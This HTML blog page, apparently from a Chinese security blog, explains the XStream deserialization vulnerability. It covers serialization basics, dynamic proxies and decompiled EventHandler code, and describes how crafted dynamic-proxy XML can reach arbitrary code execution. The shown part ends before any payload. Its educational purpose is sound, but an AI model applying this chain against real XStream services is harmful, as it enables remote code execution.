@@ -1,0 +1,740 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,Java,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/kanxi.jpg">
+  
+  <title>Java XStream反序列化漏洞 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+      <img class="avatar" src="/j.jpg">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="post" class="pure-menu-link">文章</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/archives" style="color:#202020;" class="pure-menu-link">归档</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories" style="color:#202020;" class="pure-menu-link">分类</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/tags" style="color:#202020;" class="pure-menu-link">标签</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="Web安全" class="pure-menu-link">Web安全</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/Web安全基础/" style="color:#202020;" class="pure-menu-link">Web安全基础&amp;Tricks</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">Web安全之机器学习</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/WriteUp-Web/" style="color:#202020;" class="pure-menu-link">WriteUp Web</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="PHP" class="pure-menu-link">PHP</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/PHP/" style="color:#202020;" class="pure-menu-link">PHP安全</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">CMS</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="Java" class="pure-menu-link">Java</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/Java/" style="color:#202020;" class="pure-menu-link">Java安全</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">Struts2</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="https://www.mi1k7ea.com/categories/Java/Spring/" style="color:#202020;" class="pure-menu-link">Spring</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">SpringCloud</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="Python" class="pure-menu-link">Python</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/Python/" style="color:#202020;" class="pure-menu-link">Python安全</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">Python安全开发</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">爬虫</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">Django</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="JavaScript" class="pure-menu-link">JavaScript</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/JavaScript/" style="color:#202020;" class="pure-menu-link">JavaScript安全</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">Node.js</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="GO" class="pure-menu-link">GO</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">GO安全</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="二进制安全" class="pure-menu-link">二进制安全</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/二进制基础/" style="color:#202020;" class="pure-menu-link">二进制基础</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/C-C/" style="color:#202020;" class="pure-menu-link">C/C++</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">Fuzzing</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/Pwn/" style="color:#202020;" class="pure-menu-link">Pwn</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/WriteUp-Pwn/" style="color:#202020;" class="pure-menu-link">WriteUp Pwn</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/WriteUp-Reverse/" style="color:#202020;" class="pure-menu-link">WriteUp Reverse</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="渗透测试" class="pure-menu-link">渗透测试</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">基础&amp;Tricks</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">Kali</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">Metasploit</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">内网渗透</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">提权</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">免杀</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">工具</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="OS" class="pure-menu-link">OS</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">Windows</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">Linux</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="about" class="pure-menu-link">关于</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/about" style="color:#202020;" class="pure-menu-link">Mi1k7ea</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="https://blog.csdn.net/ski_12" style="color:#202020;" class="pure-menu-link">CSDN博客</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/atom.xml" style="color:#202020;" class="pure-menu-link">订阅</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        Java XStream反序列化漏洞
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2019-10-21T15:19:07.000Z">
+        2019-10-21
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+      </span>
+    </span>
+      <span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="XStream简介"><a href="#XStream简介" class="headerlink" title="XStream简介"></a>XStream简介</h3><p>XStream是Java类库，可以用来将对象序列化为XML格式或将XML反序列化为对象。</p>
+<h3 id="使用XStream实现序列化与反序列化"><a href="#使用XStream实现序列化与反序列化" class="headerlink" title="使用XStream实现序列化与反序列化"></a>使用XStream实现序列化与反序列化</h3><p>下面看下如何使用XStream进行序列化和反序列化操作的。</p>
+<p>先定义IPerson.java接口类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IPerson</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接着定义Person类实现前面的接口：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">IPerson</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">output</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.print(<span class="string">"Hello, this is "</span> + <span class="keyword">this</span>.name + <span class="string">", age "</span> + <span class="keyword">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>XStream序列化是调用XStream.toXML()来实现的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.age = <span class="number">6</span>;</span><br><span class="line">        p.name = <span class="string">"mi1k7ea"</span>;</span><br><span class="line">        XStream xstream = <span class="keyword">new</span> XStream(<span class="keyword">new</span> DomDriver());</span><br><span class="line">        String xml = xstream.toXML(p);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输出内容：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Person</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mi1k7ea<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">age</span>&gt;</span>6<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Person</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>将输出结果保存为person.xml文件。</p>
+<p>XStream反序列化是用过调用XStream.fromXML()来实现的，其中获取XML文件内容的方式可以通过Scanner()或FileInputStream都可以：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.io.xml.DomDriver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line"><span class="comment">//        String xml = new Scanner(new File("person.xml")).useDelimiter("\\Z").next();</span></span><br><span class="line">        FileInputStream xml = <span class="keyword">new</span> FileInputStream(<span class="string">"person.xml"</span>);</span><br><span class="line">        XStream xstream = <span class="keyword">new</span> XStream(<span class="keyword">new</span> DomDriver());</span><br><span class="line">        Person p = (Person) xstream.fromXML(xml);</span><br><span class="line">        p.output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输出结果为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, this is mi1k7ea, age 6</span><br></pre></td></tr></table></figure>
+<h3 id="Java动态代理机制"><a href="#Java动态代理机制" class="headerlink" title="Java动态代理机制"></a>Java动态代理机制</h3><p>在代码编译时未确定具体的被代理类，而在代码运行时动态加载被代理的类。在Java中java.lang.reflect包下提供了一个Proxy类和一个InvocationHandler接口，通过使用这个类和接口就可以生成动态代理对象。在程序运行过程中产生的这个对象，其实就是通过反射机制来生成的一个代理。</p>
+<p>通过动态代理机制，可以为某一个对象动态生成一个代理对象来替代对原对象的访问，可以有效地控制对原对象的访问并且能够很好地隐藏和保护原对象，此外还能在原对象函数的基础上添加一些额外的操作，如打印日志等。</p>
+<p>具体的可参考：<a href="https://www.mi1k7ea.com/2019/02/01/Java动态代理机制/">Java动态代理机制</a></p>
+<h3 id="EventHandler类"><a href="#EventHandler类" class="headerlink" title="EventHandler类"></a>EventHandler类</h3><p>EventHandler类为动态生成事件侦听器提供支持，这些侦听器的方法执行一条涉及传入事件对象和目标对象的简单语句。</p>
+<p>EventHandler类是实现了InvocationHandler的一个类，设计本意是为交互工具提供beans，建立从用户界面到应用程序逻辑的连接。</p>
+<p>EventHandler类定义的代码如下，其含有target和action属性，在EventHandler.invoke()-&gt;EventHandler.invokeInternal()-&gt;MethodUtil.invoke()的函数调用链中，会将前面两个属性作为类方法和参数继续反射调用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EventHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line">    <span class="keyword">private</span> String action;</span><br><span class="line">	...</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(<span class="keyword">final</span> Object proxy, <span class="keyword">final</span> Method method, <span class="keyword">final</span> Object[] arguments)</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">                <span class="keyword">return</span> invokeInternal(proxy, method, arguments);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="function"><span class="keyword">private</span> Object <span class="title">invokeInternal</span><span class="params">(Object proxy, Method method, Object[] arguments)</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line">                Method targetMethod = Statement.getMethod(</span><br><span class="line">                             target.getClass(), action, argTypes);</span><br><span class="line">                ...</span><br><span class="line">                <span class="keyword">return</span> MethodUtil.invoke(targetMethod, target, newArgs);</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里重点看下EventHandler.invokeInternal()函数的代码逻辑，如注释：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">invokeInternal</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line"><span class="comment">//-------------------------------------part1----------------------------------</span></span><br><span class="line"><span class="comment">//作用:获取interface的name,即获得Comparable,检查name是否等于以下3个名称</span></span><br><span class="line">        String var4 = var2.getName();</span><br><span class="line">        <span class="keyword">if</span> (var2.getDeclaringClass() == Object.class) &#123;</span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">"hashCode"</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Integer(System.identityHashCode(var1));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">"equals"</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1 == var3[<span class="number">0</span>] ? Boolean.TRUE : Boolean.FALSE;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">"toString"</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1.getClass().getName() + <span class="string">'@'</span> + Integer.toHexString(var1.hashCode());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//-------------------------------------part2----------------------------------</span></span><br><span class="line"><span class="comment">//貌似获取了一个class和object</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.listenerMethodName != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.listenerMethodName.equals(var4)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Class[] var5 = <span class="keyword">null</span>;</span><br><span class="line">            Object[] var6 = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.eventPropertyName == <span class="keyword">null</span>) &#123;</span><br><span class="line">                var6 = <span class="keyword">new</span> Object[<span class="number">0</span>];</span><br><span class="line">                var5 = <span class="keyword">new</span> Class[<span class="number">0</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Object var7 = <span class="keyword">this</span>.applyGetters(var3[<span class="number">0</span>], <span class="keyword">this</span>.getEventPropertyName());</span><br><span class="line">                var6 = <span class="keyword">new</span> Object[]&#123;var7&#125;;</span><br><span class="line">                var5 = <span class="keyword">new</span> Class[]&#123;var7 == <span class="keyword">null</span> ? <span class="keyword">null</span> : var7.getClass()&#125;;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//------------------------------------------------------------------------------</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">int</span> var12 = <span class="keyword">this</span>.action.lastIndexOf(<span class="number">46</span>);</span><br><span class="line">                <span class="keyword">if</span> (var12 != -<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.target = <span class="keyword">this</span>.applyGetters(<span class="keyword">this</span>.target, <span class="keyword">this</span>.action.substring(<span class="number">0</span>, var12));</span><br><span class="line">                    <span class="keyword">this</span>.action = <span class="keyword">this</span>.action.substring(var12 + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//--------------------------------------part3----------------------------------------</span></span><br><span class="line"><span class="comment">//var13获取了method的名称, var13=public java.lang.Process java.lang.ProcessBuilder.start() throws java.io.IOException</span></span><br><span class="line">                Method var13 = Statement.getMethod(<span class="keyword">this</span>.target.getClass(), <span class="keyword">this</span>.action, var5);</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">//判断var13是否为空,当然不为空啦</span></span><br><span class="line">                <span class="keyword">if</span> (var13 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    var13 = Statement.getMethod(<span class="keyword">this</span>.target.getClass(), <span class="string">"set"</span> + NameGenerator.capitalize(<span class="keyword">this</span>.action), var5);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (var13 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    String var9 = var5.length == <span class="number">0</span> ? <span class="string">" with no arguments"</span> : <span class="string">" with argument "</span> + var5[<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"No method called "</span> + <span class="keyword">this</span>.action + <span class="string">" on "</span> + <span class="keyword">this</span>.target.getClass() + var9);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//-------------------------------------part4----------------------------------</span></span><br><span class="line"><span class="comment">//调用invoke,调用函数,执行命令</span></span><br><span class="line">                    <span class="keyword">return</span> MethodUtil.invoke(var13, <span class="keyword">this</span>.target, var6);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//------------------------------------------------------------------------------</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var10) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(var10);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var11) &#123;</span><br><span class="line">                Throwable var8 = var11.getTargetException();</span><br><span class="line">                <span class="keyword">throw</span> var8 <span class="keyword">instanceof</span> RuntimeException ? (RuntimeException)var8 : <span class="keyword">new</span> RuntimeException(var8);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Converter转换器"><a href="#Converter转换器" class="headerlink" title="Converter转换器"></a>Converter转换器</h3><p>XStream为Java常见的类型提供了Converter转换器。转换器注册中心是XStream组成的核心部分。</p>
+<p>转换器的职责是提供一种策略，用于将对象图中找到的特定类型的对象转换为XML或将XML转换为对象。</p>
+<p>简单地说，就是输入XML后它能识别其中的标签字段并转换为相应的对象，反之亦然。</p>
+<p>转换器需要实现3个方法：</p>
+<ul>
+<li>canConvert方法：告诉XStream对象，它能够转换的对象；</li>
+<li>marshal方法：能够将对象转换为XML时候的具体操作；</li>
+<li>unmarshal方法：能够将XML转换为对象时的具体操作；</li>
+</ul>
+<p>具体参考：<a href="http://x-stream.github.io/converters.html" target="_blank" rel="noopener">http://x-stream.github.io/converters.html</a></p>
+<p><strong>DynamicProxyConverter</strong></p>
+<p>DynamicProxyConverter即动态代理转换器，是XStream支持的一种转换器，其存在使得XStream能够把XML内容反序列化转换为动态代理类对象：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/23.png" alt=""></p>
+<p>XStream反序列化漏洞的PoC都是以DynamicProxyConverter这个转换器为基础来编写的。</p>
+<p>以官网给的例子为例：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">interface</span>&gt;</span>com.foo.Blah<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">interface</span>&gt;</span>com.foo.Woo<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"com.foo.MyHandler"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">something</span>&gt;</span>blah<span class="tag">&lt;/<span class="name">something</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>dynamic-proxy标签在XStream反序列化之后会得到一个动态代理类对象，当访问了该对象的com.foo.Blah或com.foo.Woo这两个接口类中声明的方法时（即interface标签内指定的接口类），就会调用handler标签中的类方法com.foo.MyHandler。</p>
+<h2 id="0x02-XStream反序列化漏洞"><a href="#0x02-XStream反序列化漏洞" class="headerlink" title="0x02 XStream反序列化漏洞"></a>0x02 XStream反序列化漏洞</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>在1.4.x系列版本中，&lt;=1.4.6或=1.4.10是存在反序列化漏洞的。</p>
+<h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>XStream是自己实现的一套序列化和反序列化机制，核心是通过Converter转换器来将XML和对象之间进行相互的转换，这便与原生的Java序列化和反序列化机制有所区别，因此两者的反序列化漏洞也是有着很大区别的。</p>
+<p>XStream反序列化漏洞的存在是因为XStream支持一个名为DynamicProxyConverter的转换器，该转换器可以将XML中dynamic-proxy标签内容转换成动态代理类对象，而当程序调用了dynamic-proxy标签内的interface标签指向的接口类声明的方法时，就会通过动态代理机制代理访问dynamic-proxy标签内handler标签指定的类方法；利用这个机制，攻击者可以构造恶意的XML内容，即dynamic-proxy标签内的handler标签指向如EventHandler类这种可实现任意函数反射调用的恶意类、interface标签指向目标程序必然会调用的接口类方法；最后当攻击者从外部输入该恶意XML内容后即可触发反序列化漏洞、达到任意代码执行的目的。</p>
